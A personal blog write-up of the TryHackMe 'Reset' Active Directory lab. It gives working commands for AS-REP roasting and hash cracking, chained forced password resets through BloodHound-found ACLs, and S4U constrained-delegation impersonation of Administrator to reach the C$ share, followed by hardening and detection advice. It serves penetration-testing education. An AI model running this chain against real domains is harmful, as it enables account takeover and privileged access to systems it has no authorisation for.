---
layout: post
title: "TryHackMe Reset (Hard) — Full Active Directory Pentest Walkthrough"
date: 2026-11-12 19:30:00 +0100
categories: [TryHackMe, Active Directory]
tags: [tryhackme, reset, active-directory, bloodhound, asrep-roasting, kerberos, constrained-delegation, impacket, smb, pentest, red-team]
description: "Full, evidence-based walkthrough of TryHackMe Reset (Hard): SMB enumeration, AS-REP Roasting, BloodHound ACL analysis, delegated password resets, Kerberos S4U and SMB access. Credentials, hashes and flags redacted."
mermaid: true
---

> **Room:** [TryHackMe — Reset](https://tryhackme.com/room/resetui)  
> **Difficulty:** Hard · **Completed:** 30 October 2026 · **Author:** Kossi Richard Allado (allakori)  
> **Lab domain:** `thm.corp` · **Host:** `HAYSTACK` / `haystack.thm.corp` · **Lab IP during my session:** `10.128.171.57`  
> **Sensitive values:** Passwords, cracked hashes and flag contents are **not published**.

## 0. Introduction: what this write-up documents

On **30 October 2026**, I completed **Reset**, an Active Directory challenge marked **Hard** on TryHackMe. Ironically, once I understood its permissions graph, it felt like **the easiest Active Directory room I had tackled so far**.

This is my technical reconstruction from the commands and outputs I retained during that session, not a claim that I have a perfect unbroken terminal recording. I have therefore marked three kinds of evidence throughout:

- **Recorded:** I preserved the actual command or its output from my session. Where a command originally contained a password, only that argument is replaced with a variable or `[REDACTED]`.
- **Reconstructed command:** Equivalent syntax for an operation I performed, but not a verbatim command I can prove I typed.
- **Observed outcome:** My retained output establishes that the step worked; any omitted intermediate activity is called out explicitly.

This distinction matters. A useful pentest report should help readers understand both **the exploit mechanics** and **the reliability of the evidence**.

### Attack chain overview

Here is the actual progression I documented, with no secrets exposed:

```mermaid
flowchart TD
    A["HAYSTACK / THM.CORP<br/>Windows & AD enumeration"] --> B["Anonymous SMB access<br/>Data/onboarding documents"]
    B --> C["Domain identity discovery<br/>AS-REP Roasting"]
    C --> D["TABATHA_BRITT<br/>Cracked AS-REP credentials"]
    D --> E["BloodHound: GenericAll<br/>control over SHAWNA_BRAY"]
    E --> F["SHAWNA_BRAY<br/>ForceChangePassword"]
    F --> G["CRUZ_HALL<br/>ForceChangePassword"]
    G --> H["DARLA_WINTERS<br/>Kerberos constrained delegation"]
    H --> I["S4U2Self / S4U2Proxy<br/>Administrator CIFS service ticket"]
    I --> J["Kerberos SMB access to C$<br/>Both room objectives verified"]
```

**Important nuance:** My preserved initial SMB-document evidence does not demonstrate every step by which I derived the AS-REP target list. I do **not** present a third-party foothold technique as my own when I do not have its original terminal evidence.

## 1. Reconnaissance — identify the domain controller

I started with service enumeration against the lab-provided IP. The **observed open ports** in the retained scan were:

| TCP port | Service / role | Why it mattered |
| --- | --- | --- |
| 53 | DNS | Windows domain name resolution |
| 88, 464 | Kerberos / kpasswd | Domain authentication and credential policy |
| 135, 139 | RPC / NetBIOS | Windows remote procedure and discovery interfaces |
| 389 | LDAP | Domain objects and identities |
| 445 | SMB | Shared files, authentication and share permissions |
| 593 | RPC over HTTP | Additional Windows RPC surface |
| 636 | LDAPS-facing endpoint | TLS/LDAP surface; scan result requires interpretation |
| 3268, 3269 | Global Catalog | Directory queries |
| 3389 | RDP | Remote desktop, not proof that a user may log in |
| 5985 | WinRM / HTTP | Remote PowerShell administration |

The host identified itself as **HAYSTACK** in the **THM.CORP** domain. The environment was clearly Windows/Active Directory.

### Nmap — reproducible command

The *specific full original scan invocation* was not preserved; the following reproduces the relevant discovery approach:

```bash
# Reconstructed equivalent — the IP is from my session, not a permanent room IP.
nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 \
  10.128.171.57
```

**Takeaway:** An open port is a lead, not a vulnerability. For this machine, SMB, Kerberos and LDAP were more useful investigative starting points than treating every service as independently exploitable.

## 2. SMB: anonymous access and onboarding material

The first useful finding was that **the `data` share was accessible without valid domain credentials**. That made its contents worth reviewing before trying more aggressive tests.

### 2.1 Connect to the share

**Recorded command — 30 October 2026:**

```bash
smbclient //10.128.171.57/data -N
```

Here, `-N` tells `smbclient` not to prompt for a password. I then explored the available files and found an `onboarding` directory containing a PDF with a randomized filename.

**Recorded file-listing detail (other entries omitted):**

```text
x5oa55w5.0vj.pdf    3032659 bytes
```

A readable onboarding document is not automatically a critical vulnerability. The decisive question is **what information it contains and who can read it**.

### 2.2 Download and inspect the onboarding PDF

This part is now grounded in my **30 October 2026 SMB session**, not just a generic illustration. I kept the exact commands and redacted the one sensitive value in the extracted document.

**Recorded SMB commands — from the anonymous connection:**

```console
$ smbclient //10.128.171.57/data -N
smb: \\> cd onboarding
smb: \\onboarding\\> prompt off
smb: \\onboarding\\> mget *
```

`cd onboarding` enters the directory discovered in the share. `prompt off` disables confirmation for each file and `mget *` downloads the files in that directory. The precise full download progress lines were not retained; the commands and the PDF filename were.

**Relevant directory entry from the original listing (other entries omitted):**

```text
x5oa55w5.0vj.pdf    3032659 bytes
```

After downloading the PDF, I extracted its text:

**Recorded terminal command:**

```console
$ pdftotext x5oa55w5.0vj.pdf -
```

The trailing `-` sends extracted text to standard output. That makes it possible to inspect the document without modifying its contents or creating a new text file.

**Extracted PDF text — selected excerpt, original spelling retained, password redacted:**

```text
The Art of Effective User Onboarding
...
Example Email

Subject: Welcome to Reset
Dear LILY ONEILL,

The initial passowrd is: [REDACTED]

Best regards,
The Reset Team
...
```

**Why these specific lines matter:**

- `Subject: Welcome to Reset` identifies the document as an onboarding example/message rather than a system banner.
- `Dear LILY ONEILL` associates the credential-like instruction with an identifiable account.
- `The initial passowrd is: [REDACTED]` is the sensitive evidence. The typo **passowrd** is present in the original PDF; I have not corrected it to avoid changing the evidence.
- The rest of the PDF is omitted because it does not add to the finding. **No password, cracked hash or flag appears in this article.**

Crucially, **recovering a password-like string from a document is not the same as validating an account**. My later authentication checks and the separate AS-REP Roasting result must be evaluated on their own merits; I do not claim that the PDF password provided the eventual privileged access.

### 2.3 Why this output matters

The interesting part is not the PDF filename or the `pdftotext` command alone. The output answers a concrete security question:

1. **Exposure:** an onboarding document was readable from a share accessible without a domain password.
2. **Sensitive content:** the extracted text associated an identifiable domain user, `LILY_ONEILL`, with an initial-password instruction.
3. **Risk:** if a real, valid credential is placed in such a document, an unauthorized reader could attempt to use it. This is an **information-exposure finding**, not automatically proof of administrative access.

**Important validation limit:** My historical testing of `LILY_ONEILL` over SMB was mapped to a **Guest** context, and a separate LDAP attempt did not establish an authenticated session. Therefore, I cannot honestly claim that the PDF alone immediately provided a working privileged domain account. I continued investigating the directory and authentication configuration instead.

In a professional report, this distinction would be explicit:

| Evidence | Conclusion |
| --- | --- |
| Anonymous/no-password SMB connection succeeds | The share can be reached without supplying a domain password |
| PDF contains `The initial passowrd is: [REDACTED]` | Credential-like material is exposed in the document |
| SMB attempt as the named user is mapped to Guest | A valid, authorized domain session was **not** demonstrated by that test |
| Subsequent AD investigations produce a separate confirmed account | That later result must be documented as a distinct step, not automatically attributed to the PDF |

**Remediation:** Remove plaintext credentials from onboarding templates; prevent unauthenticated reading of sensitive shares; provide initial secrets via an appropriate secure enrollment channel; rotate exposed passwords; and verify file-level permissions, not just share-level access.

## 3. Kerberos: AS-REP Roasting

I subsequently identified a domain account vulnerable to **AS-REP Roasting**: **TABATHA_BRITT**.

Normally, Kerberos pre-authentication helps prevent obtaining an AS-REP response for arbitrary accounts without first demonstrating knowledge of the account's secret. When a user is configured without this requirement, an attacker may request encrypted AS-REP material and test password guesses **offline**.

This does not itself confer administrator privileges: the real impact depends on whether the password can be recovered and which rights the account possesses.

### Requesting AS-REP material

My retained session contains the successful cracking operation, but does **not** preserve the exact command that originally requested the AS-REP data. Here is the equivalent Impacket syntax, clearly labeled **reconstructed**:

```bash
# Reconstructed equivalent, not claimed as a verbatim historical command.
# users.txt is a candidate username list from an authorized domain lab.
impacket-GetNPUsers 'thm.corp/' \
  -usersfile users.txt -no-pass -request \
  -format john -outputfile asrep.hashes \
  -dc-ip 10.128.171.57
```

The format and filename are important: John the Ripper needs correctly formatted AS-REP material, and a saved file makes the offline step repeatable.

### John the Ripper — recorded command

The actual John command from my October terminal history was:

```bash
john --format=krb5asrep \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  asrep.hashes
```

**Recorded result, sanitized:**

```text
[REDACTED PASSWORD]  ($krb5asrep$23$TABATHA_BRITT@THM.CORP)
```

This means a password was recovered for **TABATHA_BRITT**, not that a privileged shell had already been obtained. The hash and password bytes are intentionally withheld.

### Validate the identity using NetExec

The original successful SMB validation command used `nxc smb` with **TABATHA_BRITT**. Below the password is supplied interactively rather than copied from the original command line:

```bash
read -rsp 'TABATHA_BRITT password: ' TABATHA_PASS; echo

nxc smb 10.128.171.57 \
  -u TABATHA_BRITT -p "$TABATHA_PASS" -d thm.corp
```

**Observed result:** SMB authentication succeeded. A separate WinRM attempt with the same account **failed to establish an interactive shell**.

That difference is critical:

- **Authentication works**: the account and password are valid for the tested service.
- **WinRM authorization works**: the account is permitted to create a remote-management session.
- **AD object rights work**: the account may perform specific delegated directory operations.

These are distinct privileges. A failed WinRM login is not proof that an account is useless.

## 4. BloodHound: turn domain rights into a testable path

With an authenticated domain identity, I collected Active Directory relationship information using BloodHound-Python.

### Recorded BloodHound collection, password redacted

This is the original tool/argument structure from my session; only the inline password is replaced with the shell variable already defined above:

```bash
bloodhound-python \
  -u TABATHA_BRITT -p "$TABATHA_PASS" \
  -d thm.corp -ns 10.128.171.57 -c all
```

The **recorded collection output** reported:

```text
Found 42 users
Found 55 groups
Found 3 gpos
Found 222 ous
Found 19 containers
Found 0 trusts
```

These counts describe collected directory objects; they are **not** counts of vulnerabilities or compromised accounts.

BloodHound's real value is in relations between **principals**, **objects**, and **effective permissions**. The path I identified was:

```text
TABATHA_BRITT
    |
    | GenericAll
    v
SHAWNA_BRAY
    |
    | ForceChangePassword
    v
CRUZ_HALL
    |
    | ForceChangePassword
    v
DARLA_WINTERS
    |
    | Kerberos constrained delegation
    v
CIFS service on haystack.thm.corp
```

### Why these edges matter

**GenericAll:** The principal can exercise very broad control over the target AD object. If a user object is controlled in this way, the attacker may be able to modify security-relevant properties, including the credential state, depending on the effective permission and protections.

**ForceChangePassword:** This delegated right can permit a principal to **reset the target account's password without knowing its previous password**. It is distinct from knowing or cracking that password.

**Constrained delegation:** A trusted service account may request tickets to specific downstream SPNs on behalf of another identity. Compromise of the account that controls this configuration can cross a particularly sensitive identity boundary.

The key mistake would be to treat every BloodHound edge as automatically exploitable. Here, I **validated the sequence** by changing the relevant test-account passwords and authenticating with each new identity.

## 5. Chaining password-reset rights

My October terminal session contained three successful password-reset operations using Samba's `net rpc password` command:

1. **TABATHA_BRITT → SHAWNA_BRAY**, enabled by `GenericAll`.
2. **SHAWNA_BRAY → CRUZ_HALL**, using `ForceChangePassword`.
3. **CRUZ_HALL → DARLA_WINTERS**, using `ForceChangePassword`.

Below are the **same operation patterns**, with passwords replaced by variables. The actual commands I ran used inline secrets; I do not republish them.

### 5.1 TABATHA_BRITT controls SHAWNA_BRAY

```bash
# Prompt for a password without exposing it in this write-up.
read -rsp 'New lab password for SHAWNA_BRAY: ' SHAWNA_PASS; echo

net rpc password 'SHAWNA_BRAY' "$SHAWNA_PASS" \
  -U "THM.CORP/TABATHA_BRITT%$TABATHA_PASS" \
  -S haystack.thm.corp
```

**Expected behavior and observed outcome:** The command succeeded in my session; the newly controlled identity could then be used in authenticated tests.

### 5.2 SHAWNA_BRAY controls CRUZ_HALL

```bash
read -rsp 'New lab password for CRUZ_HALL: ' CRUZ_PASS; echo

net rpc password 'CRUZ_HALL' "$CRUZ_PASS" \
  -U "THM.CORP/SHAWNA_BRAY%$SHAWNA_PASS" \
  -S haystack.thm.corp
```

**Observed outcome:** The operation worked, and later credentials for **CRUZ_HALL** were successfully validated.

### 5.3 CRUZ_HALL controls DARLA_WINTERS

```bash
read -rsp 'New lab password for DARLA_WINTERS: ' DARLA_PASS; echo

net rpc password 'DARLA_WINTERS' "$DARLA_PASS" \
  -U "THM.CORP/CRUZ_HALL%$CRUZ_PASS" \
  -S haystack.thm.corp
```

**Observed outcome:** This gave me control of the identity **DARLA_WINTERS**, the key account for the next phase.

### Why this technique worked

Each step was authorized by an **overly permissive AD object relationship**. No previous target-account password was needed for a delegated reset. The escalated capability came from the *ACL*, not from cracking three additional hashes.

For each reset, validating SMB authentication with the resulting identity is more meaningful than merely assuming the password changed because a command returned without a visible exception.

**A practical lesson:** If a domain user has no direct route to an administrator group, inspect the **transitive rights graph**. Delegated administration can unintentionally connect several apparently low-privilege identities to a high-impact service account.

## 6. Kerberos constrained delegation — S4U2Self and S4U2Proxy

Once I controlled **DARLA_WINTERS**, I investigated the delegated service access represented in the AD data.

### What's happening technically?

For a properly configured constrained-delegation scenario, the S4U extensions let an eligible service obtain a service ticket for a user:

- **S4U2Self:** the service requests a ticket to itself representing the named user, within the applicable Kerberos rules.
- **S4U2Proxy:** the service uses the prior ticket to request a ticket for a permitted downstream service principal.
- **SPN:** the service principal name specifies which service the final ticket is intended for.

This matters because **a service ticket is not the user's password**. The ticket can confer access to a particular service without the attacker ever learning that user's secret.

### Impacket getST — actual successful command, secret redacted

This command was **executed in my session**. Only the password argument is substituted:

```bash
impacket-getST \
  -spn 'cifs/haystack.thm.corp' \
  -impersonate Administrator \
  -dc-ip 10.128.171.57 \
  "thm.corp/DARLA_WINTERS:$DARLA_PASS"
```

**The actual command output included the following lines:**

```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```

These are the decisive facts:

1. The operation progressed through **both S4U stages**.
2. The requested impersonated identity was **Administrator**.
3. The resulting ticket was for the **CIFS** service on the target host.
4. Impacket wrote a local **Kerberos cache** file.

**What this does not prove:** I did not recover the Administrator's plaintext password. My next step was to prove the actual scope of access by using the ticket.

## 7. Kerberos SMB access and verification of both objectives

### 7.1 Set the ticket cache

This exact export command was recorded in my terminal:

```bash
export KRB5CCNAME="$PWD/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache"
```

`KRB5CCNAME` tells Kerberos-aware clients which cache to consult. It is easy to confuse a valid ticket with a usable ticket: a wrong cache path, host name or SPN can make the final command fail even if ticket issuance succeeded.

### 7.2 Connect with Impacket SMBClient

The next command is **verbatim from my successful session**:

```bash
impacket-smbclient -k -no-pass -target-ip 10.128.171.57 \
  'thm.corp/Administrator@haystack.thm.corp'
```

Why these options?

- `-k`: use Kerberos authentication.
- `-no-pass`: do not prompt for or supply an account password; rely on existing Kerberos material.
- `-target-ip`: specify the lab IP while preserving the DNS/SPN host name in the target identity.

A successful SMB connection demonstrates that the **CIFS service accepted the ticket**. It should not be described as a full Administrator interactive shell or as knowledge of the Administrator password.

### 7.3 Inspect the administrative share

My retained interaction then navigated through the SMB client:

```text
shares
use C$
cd Users
cd Administrator
cd Desktop
cat root.txt
```

**Observed:** The room's root objective was present in the Administrator Desktop location and was successfully retrieved.

I also reached the `automate` user profile and verified `user.txt`. **Neither value is included here.**

```text
Objective 1: user.txt — VERIFIED (contents withheld)
Objective 2: root.txt — VERIFIED (contents withheld)
```

This gave me a concrete, validated result beyond graph analysis or ticket issuance: the delegated authentication path provided access to a sensitive administrative file share.

## 8. Root-cause analysis

The point of a write-up is not simply that a series of commands worked. It should explain the organizational and technical conditions that allowed them to work.

| Finding | Root cause | Security impact |
| --- | --- | --- |
| Excessive exposure of onboarding material | Shared files reachable outside the intended user population | Credentials or operational details may leak |
| AS-REP Roastable account with a weak password | Kerberos pre-authentication exception and inadequate password strength | Offline password recovery against a domain identity |
| Overly permissive AD object ACLs | Excessive `GenericAll` and delegated password-reset authority | Transitive control of additional identities |
| Sensitive constrained delegation | Delegation permissions assigned to an account reachable through the ACL chain | Service-ticket impersonation to sensitive service access |

These findings reinforce a central lesson: **security impact is compositional**. A single weak password might not provide remote shell access. Several rights that appear unimportant on their own can combine into a much more serious path.

## 9. Blue Team: hardening and detection

### Preventive controls

1. Remove initial credentials and other secrets from broadly accessible onboarding material; review SMB ACLs and guest/anonymous access.
2. Require Kerberos pre-authentication for normal user accounts and review exceptions; improve password quality.
3. Audit AD ACL assignments, especially `GenericAll`, `GenericWrite`, `WriteDACL` and `ForceChangePassword` on sensitive objects.
4. Reduce transitive administrative rights: investigate **who can reset an account that itself controls another privileged identity**.
5. Restrict Kerberos delegation to the minimum required SPNs and protect service accounts from unnecessary object-control permissions.
6. Review sensitive share permissions and service-account access, and retest each control after modification.

### Relevant detection hypotheses

The following Windows security events are **defensive telemetry recommendations**, **not** a claim that these log lines were collected in my lab session:

| Activity | Candidate telemetry | What analysts should correlate |
| --- | --- | --- |
| Unusual Kerberos requests | 4768, 4769 | Account baseline, source, ticket pattern |
| Password resets | 4724 | Initiator, target, time, delegated-right justification |
| AD object changes | 5136 where configured | Target DN, attribute modified, actor |
| AD permission changes | 4670 / directory auditing as applicable | Permission origin and effective security boundary |
| Share access | 5140, 5145 with auditing enabled | Sensitive paths, identity and read/write action |
| Privileged service access | Authentication and file-access logs | Ticket use, unexpected access to sensitive resources |

No single event is conclusive. Correlation across identity, Kerberos and file-access telemetry is far more useful than a rule that matches only one tool name.

## 10. What I would include in a professional pentest report

In a client-facing report, I would separate **the evidence, the root cause and the demonstrated impact**:

- **Scope:** authorized host(s), domain, time window and test identity.
- **Methodology:** service mapping, SMB inspection, credential validation and identity-permission analysis.
- **Evidence:** commands and relevant **redacted** output, screenshots, permissions and their context.
- **Exploitability:** prerequisites for each action, including the difference between authentication and authorization.
- **Impact:** exactly which service or administrative action the controlled identity enabled.
- **Remediation:** minimum necessary ACLs, account hardening, delegation restrictions.
- **Retest:** prove the unauthorized path no longer functions while legitimate delegated workflows remain operational.

### Evidence provenance

| Step | Status of my October 30 record |
| --- | --- |
| Lab completion and difficulty | **Recorded** |
| Host/domain/port observations | **Recorded** |
| Anonymous SMB and onboarding PDF | **Recorded** |
| Full original SMB download command | **Not preserved; equivalent shown** |
| Original AS-REP request command | **Not preserved; equivalent shown** |
| John crack of `TABATHA_BRITT` | **Recorded** |
| NetExec authentication; WinRM failure | **Recorded** |
| BloodHound collection and object counts | **Recorded** |
| Permission relationships | **Recorded** |
| Three `net rpc password` operations | **Recorded; credentials redacted** |
| `impacket-getST` S4U request and output | **Recorded; credential redacted** |
| `KRB5CCNAME` and Kerberos SMB client | **Recorded verbatim** |
| Both room objectives | **Verified; flag values withheld** |

## 11. Conclusion

Reset was rated **Hard**, but it became surprisingly straightforward once I followed the **Active Directory permission relationships** instead of searching endlessly for an unrelated exploit. The central sequence was:

**Kerberos credential recovery → ACL-based identity control → constrained delegation → service-specific Kerberos authentication → verified access.**

The strongest takeaway is broader than the room: a penetration tester should understand **why a permission exists, who can use it, and what boundary it crosses**. Successful pentesting is not a checklist of commands; it is a reproducible argument supported by evidence.

I completed both objectives in this authorized TryHackMe environment. **No plaintext passwords, cracked hashes or flag values have been published**.

---

**Room:** [TryHackMe Reset](https://tryhackme.com/room/resetui) · **Portfolio:** [ALLAKORI](https://allakori.github.io/) · **TryHackMe profile:** [allakori](https://tryhackme.com/p/allakori)

*For a second perspective on the same room, see [jaxafed's earlier write-up](https://jaxafed.github.io/posts/tryhackme-reset/). The commands and outcomes labeled “recorded” in this article refer to my own October 30 session; the external article is not treated as evidence of what I personally ran.*
